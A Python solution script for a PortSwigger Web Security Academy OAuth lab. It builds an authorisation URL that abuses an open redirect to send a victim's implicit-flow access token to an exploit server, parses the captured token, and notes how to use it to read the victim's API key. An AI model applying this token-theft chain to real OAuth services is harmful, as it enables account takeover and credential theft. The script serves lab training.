"""
Lab 4: Stealing OAuth access tokens via an open redirect
https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
Difficulty: Practitioner

📝 The flaw: implicit flow (response_type=token) + the client app's post-login
redirect (/post/next?path=) is open. Point redirect_uri at it — the provider
puts the token in the URL FRAGMENT, which survives the bounce because
fragments are never sent to the server but ARE preserved by browser redirects
that use window.location / 3xx on the client side.
"""

from urllib.parse import quote

from utils import get_session, log, note, extract_fragment_params

CLIENT_APP = "https://YOUR-LAB-ID.web-security-academy.net"
PROVIDER = "https://oauth-YOUR-LAB-ID.oauth-server.net"
EXPLOIT_SERVER = "https://exploit-YOUR-LAB-ID.exploit-server.net"
CLIENT_ID = "REPLACE_WITH_CLIENT_ID"


def build_malicious_auth_url():
    note("Same open-redirect chain as Lab 3, but response_type=token this time —")
    note("so the provider appends #access_token=... which rides along for free.")

    evil_redirect = f"{CLIENT_APP}/post/next?path={EXPLOIT_SERVER}/exploit"
    auth_url = (
        f"{PROVIDER}/auth"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={quote(evil_redirect, safe='')}"
        f"&response_type=token"
        f"&nonce=123"
        f"&scope=openid%20profile%20email"
    )
    log(f"Malicious auth URL: {auth_url}")
    return auth_url


def inspect_captured_token(location_header):
    """Once the exploit server's access log shows a request with #fragment attached
    (browsers DO send fragments onward through client-side JS redirects), parse it."""
    params = extract_fragment_params(location_header)
    if "access_token" in params:
        log(f"Captured access_token: {params['access_token']}")
    return params


def run():
    build_malicious_auth_url()
    note("Host a lure at /exploit that window.location's to the auth URL above,")
    note("and a logging page to receive the bounce. Deliver to victim, then pull")
    note("the access_token out of the exploit server's access log fragment.")
    note("Use that token against GET /me on the provider to read the victim's")
    note("API key, then submit it on the client app to solve the lab.")


if __name__ == "__main__":
    run()
